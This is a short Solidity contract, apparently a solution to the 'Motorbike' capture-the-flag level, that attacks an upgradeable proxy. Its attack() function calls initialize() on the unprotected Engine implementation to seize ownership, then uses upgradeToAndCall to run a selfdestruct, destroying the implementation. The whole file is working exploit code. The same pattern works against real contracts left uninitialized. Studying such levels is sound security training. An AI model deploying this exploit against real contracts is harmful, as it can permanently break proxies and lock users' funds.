// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

// Methods that should be defined on the attacked contract
interface EngineInterface {
   function initialize() external;
   function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract MotorbikeAttack {

    /*
        * This function attacks the proxy implemented by Motorbike
        * It takes ownership over the Engine and changes the target of its implementation
    */
    function attack(address engine) public {
        EngineInterface(engine).initialize();
        EngineInterface(engine).upgradeToAndCall(address(this),
        abi.encodeWithSignature("selfDestruct()"));
    }

    // Conver a uint into an address 
    function uintToAddress(uint number) public pure returns (address) {
        return address(uint160(number));
    }

    // Destroy the contract and send the balance to 0
    function selfDestruct() public {
        selfdestruct(payable(address(0)));
    }
}